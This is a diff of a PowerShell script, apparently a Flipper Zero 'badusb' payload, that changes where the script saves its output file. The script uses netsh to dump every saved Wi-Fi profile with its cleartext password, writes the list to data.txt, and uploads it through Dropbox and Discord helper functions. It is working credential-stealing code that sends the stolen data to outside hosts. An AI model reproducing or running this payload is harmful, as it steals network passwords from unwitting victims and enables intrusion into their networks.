@@ -1,6 +1,3 @@
-# Set the file path for the data.txt file on the Flipper Zero SD Card
-$filePath = "C:\badusb\data\data.txt"
-
 Write-Host "Script started"
 
 $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
@@ -8,8 +5,8 @@ $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$
 Write-Host "Wi-Fi profiles gathered:"
 Write-Host $wifiProfiles
 
-# Save the data.txt file on the Flipper Zero SD Card
-$wifiProfiles | Out-File -Encoding utf8 -FilePath $filePath
+$dir = Split-Path -Parent $MyInvocation.MyCommand.Definition
+$wifiProfiles | Out-File -Encoding utf8 -FilePath "$dir\data.txt"
 
 Write-Host "Wi-Fi profiles saved to file"
 
@@ -17,13 +14,13 @@ Write-Host "Wi-Fi profiles saved to file"
 
 if (-not ([string]::IsNullOrEmpty($db))){
     Write-Host "Uploading to Dropbox..."
-    DropBox-Upload -f $filePath
+    DropBox-Upload -f "$dir\data.txt"
     Write-Host "Upload to Dropbox completed"
 }
 
 if (-not ([string]::IsNullOrEmpty($dc))){
     Write-Host "Uploading to Discord..."
-    Upload-Discord -file $filePath
+    Upload-Discord -file "$dir\data.txt"
     Write-Host "Upload to Discord completed"
 }
 
